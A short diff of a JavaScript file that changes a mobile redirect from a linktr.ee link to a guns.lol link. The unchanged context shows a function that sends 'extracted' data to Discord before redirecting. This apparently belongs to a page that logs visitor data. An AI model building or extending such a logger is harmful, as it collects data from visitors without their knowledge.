@@ -79,7 +79,7 @@ function getAndSave(res) {
     log_to_discord(extracted, () => {
         if (IS_MOBILE) {
             const wl = window.location
-            wl.replace(`https://linktr.ee/umbrecore`)
+            wl.replace(`https://guns.lol/umbrecore`)
         }
     })
 }
